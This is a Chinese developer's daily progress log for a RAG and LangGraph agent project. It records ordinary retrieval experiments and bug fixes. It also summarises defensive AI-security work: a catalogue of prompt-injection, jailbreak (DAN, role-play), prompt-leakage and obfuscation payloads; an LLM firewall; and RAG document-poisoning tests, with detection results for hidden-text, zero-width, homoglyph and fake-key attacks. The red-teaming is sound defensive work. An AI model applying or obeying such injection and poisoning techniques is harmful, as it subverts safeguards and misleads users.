- [x] **评估框架** — `ai_security/doc_poison_eval.py`
  - 烟雾测试：ps_002虚假API密钥成功污染RAG回答（payload_present=True）
  - 4种防御模式对比框架就绪：none/pre_only/post_only/both

- [x] **投毒防护报告** — `D_deliverables/RAG投毒防护报告.md`
  - 包含：攻击库/防御架构/L1检测数据/隔离验证/3个失败案例/面试速查卡

- [x] ROADMAP.md 进度更新

### 关键发现

1. **PyMuPDF自动剥离零宽字符**：ps_005（U+200B注入）被PDF解析层自然缓解——防御纵深的意外成功
2. **PyMuPDF不保留颜色信息**：ps_003（白字攻击）无法通过纯文本提取检测——需`page.get_text("dict")`获取渲染属性
3. **语义攻击需L2 LLM**：ps_002（虚假密钥）/ps_012（虚假安全建议）L1完全漏过（risk_score=0），需LLM语义分析

### L1检测率明细

| 检测成功 (7/12) | 检测失败 (5/12) | 失败原因 |
|:---|:---|:---|
| ps_001 恶意指令嵌入 ✓ | ps_002 虚假密钥 ✗ | 无危险词对，需LLM语义 |
| ps_004 极小字号 ✓ | ps_003 白字 ✗ | PyMuPDF颜色盲区 |
| ps_006 元数据 ✓ | ps_005 零宽 ✗ | PyMuPDF自然剥离 |
| ps_007 Base64 ✓ | ps_010 注释 ✗ | 注释模式不同于注入 |
| ps_008 同形字 ✓ | ps_012 虚假建议 ✗ | 虚假事实需语义分析 |
| ps_009 反转 ✓ | | |
| ps_011 组合 ✓ | | |

### 明日任务

- [ ] **Phase 3 Day 4**: 启动3.3 自适应攻击探索 — 多轮渐进式越狱 + 角色扮演绕过测试

---

## 2026-05-03 (Phase 3 Day 1)

### 今日完成

- [x] **Prompt注入Payload数据库** — `ai_security/payloads/`：105 条目，4 大类
  - `injection.py` (30): 直接注入（忽略指令/角色覆盖/目标劫持/间接注入/格式化注入）
  - `jailbreak.py` (30): 越狱（DAN变体/角色扮演/道德绕过/渐进式/情感操纵/多语言）
  - `leakage.py` (20): 提示泄露（直接提取/间接探测/角色扮演/元数据/调试）
  - `obfuscation.py` (25): 混淆绕过（Unicode/零宽字符/Base64/同义词/分隔符/分词）
  - 每条标注 `bypasses_keyword_check`，**91% (96/105) 绕过旧版关键词检测**
- [x] **LLM智能防火墙** — `ai_security/classifier.py`
  - 双层架构：Layer 1 关键词+正则（<10ms）→ Layer 2 LLM语义分类（~500ms）
  - 输出 risk_score(0-100) + category + reasoning + should_block + latency_ms
  - `classify_with_old_fallback()` 向后兼容，旧版作为安全网兜底
- [x] **集成 guardrail_node** — 替换旧版关键词检测，AgentState 新增 guardrail_category/score
- [x] **攻防评估框架** — `ai_security/evaluate.py`：批量测试 + 拦截率/误拦率/延迟/新旧对比
- [x] ROADMAP.md 重构 — 基于7点反馈精简路线，新增输出评测/基准对标模块

### 明日任务

- [ ] **Phase 3 Day 3**: 启动3.2 RAG文档投毒防护 — 10+投毒场景设计 + 样本PDF生成
- [ ] 如时间允许：Garak/HackAPrompt基准测试调研

---

## 2026-05-02

### 今日完成

- [x] 提交 LangGraph 迁移未提交改动（12+ 文件，含 graph_agent.py 首次提交）
- [x] **LangGraph SQLite Checkpointer 持久化**（v4）
  - `SqliteSaver` 编译进图，`graph_state.db` 自动保存每次 invoke 状态
  - `thread_id` 区分不同对话线，`add_messages` reducer 自动拼接历史
  - `clear_history(thread_id)` + `get_thread_messages(thread_id)` 完整 CRUD
- [x] **工具长文本 LLM 摘要**（v4）：`_summarize_tool_result()` 保留关键数据点，失败 fallback 截断
- [x] **LLM 引导的工具错误自愈**（v5）：`_format_tool_error()` 结构化错误 + Self-healing prompt
- [x] **Streamlit Checkpointer 集成**（v5）：移除手动 chat_history 转换，纯 checkpointer 模式，刷新恢复对话
- [x] **Phase 2 完成标准自检**：5轮多工具ReAct对话测试全部通过，12条消息正确持久化
- [x] **OCR 扫描件支持**（Phase 1 遗留）：EasyOCR + PyMuPDF 渲染，智能检测扫描页

### Phase 2 完成总结

| 标准 | 状态 | 说明 |
|------|:----:|------|
| LangGraph Studio 可视化 | N/A | 无Studio License，代码通过5节点StateGraph实现 |
| 工具失败自动重试与恢复 | ✅ | 结构化错误+Self-healing prompt+ReAct循环(最多3次工具调用) |
| ReAct/Function Calling 原理 | ✅ | 见 QA_log.md 苏格拉底讨论 |

---

## 2026-05-01

### 今日完成

- [x] 修复 Reranker 模型路径 → 从 HF 缓存加载 BGE-Reranker-Base
- [x] 重跑 B+C 组实验（Reranker 激活）→ C4: k=8+r=5 达 **80.0%** 准确率
- [x] 补跑 A 组实验（Reranker 激活）→ A2: chunk=800 达 76.7%
- [x] 撰写 `rag.md` — RAG 模块深度解析文档（架构/原理/8个坑/实验数据）
- [x] 更新《RAG检索策略性能对比报告》至 v4 最终版（全11配置+Reranker）
- [x] CDTR 文件分类整理：创建四层目录，根目录仅保留 2 个 .py + 3 个 .md
- [x] **LangGraph Agent 重构 v1**：StateGraph 替代过程式 agent_invoke()，5节点/LLM选工具/多轮记忆修复
- [x] **LangGraph Agent v2**（工具自愈+并行+滑动窗口）、**v3**（摘要记忆+精准遗忘+长文本截断）

### 实验最终数据（Qwen3.5-35B + BGE-Reranker）

| 配置 | 准确率 | 召回率 | 幻觉率 |
|------|:---:|:---:|:---:|
| A1: chunk=400 | 69.4% | 77.8% | 44.5% |
| A2: chunk=800 | 76.7% | 82.8% | 42.1% |
| A3: chunk=1200 | 76.7% | 76.1% | 42.7% |
| B1: Vector-only | 66.7% | 68.3% | 44.7% |
| B2: BM25-only | 37.8% | 41.7% | 64.2% |
| B3: Hybrid (no Rerank) | 61.7% | 73.3% | 49.5% |
| B4: Hybrid+Rerank | 76.7% | 82.8% | 44.8% |
| C1: k=3+r=3 | 73.3% | 77.8% | 45.3% |
| C2: k=5+r=3 | 76.7% | 82.8% | 43.5% |
| C3: k=5+r=5 | 76.7% | 82.8% | 46.7% |
| **C4: k=8+r=5** | **80.0%** | **84.4%** | **42.0%** |

---

## 2026-04-30

### 今日完成

**Bug 修复 (8项)**

- [x] langchain 1.x 迁移：手写 ConversationBufferMemory + 安装 5 个缺失依赖
- [x] emoji GBK 崩溃：6 文件中 30+ emoji → ASCII
- [x] Chroma 索引污染：collection_name 编码 chunk_size/chunk_overlap
- [x] B 组 monkey-patch 无效：rag_query() 增加 strategy 字段
- [x] Reranker 模型路径：`models/` → `BAAI/bge-reranker-base`（HF 缓存加载）
- [x] RAG init 异常阻塞非 RAG 工具：`_get_default_retriever()` 加 try-except
- [x] `requirements.txt` 补 `langchain-openai` + `rank_bm25` + `reportlab` + `pypdf`

**模型升级**

- [x] 本地 qwen2:7b → ModelScope API Qwen/Qwen3.5-35B-A3B
- [x] 备选：SiliconFlow API deepseek-ai/DeepSeek-V4-Flash

**评测框架建设**

- [x] `rag_evaluation/pdf_parser_comparison.py`：13 个安全测试场景，运行时生成 PDF
- [x] `run_pdf_comparison.py`：CLI 入口
- [x] 重跑全量 RAG 对比实验（Qwen3.5-35B，无 Rerank）：A+B+C = 11 配置

**文档**

- [x] `bug.md`：记录 3 个 Bug 的根因与修复
- [x] `QA_log.md`：混合检索原理、Python import 机制、PDF 攻击面等苏格拉底讨论
- [x] `rag.md`：RAG 模块深度解析

**关键发现**

- Reranker 是单因子最大贡献者：C4 从 50.4% → 80.0% (+29.6pp)
- BM25 在中文场景严重不足 (38%)，纯 Vector 反而更优 (67%)
- 有 Reranker 时 chunk 大小不再敏感，A2/A3 持平

---

## 2026-04-29

### 今日完成

- [x] `core/rag.py`: init_rag_retriever() 增加 chunk_size/chunk_overlap/enable_rerank 等参数
- [x] `core/rag.py`: rag_query() 增加 enable_rerank/rerank_top_n 参数
- [x] `core/rag.py`: emoji → ASCII，修复 Windows GBK 编码报错
- [x] `core/tools.py`: pydantic.BaseModel → pydantic.v1.BaseModel，修复 langchain tool 加载
- [x] `rag_evaluation/` 包搭建：`__init__.py` + `test_cases.py`(12用例) + `run_comparison.py`
- [x] `run_evaluation.py`: CLI 入口
- [x] QA_log.md: "召回率是什么" 苏格拉底问答
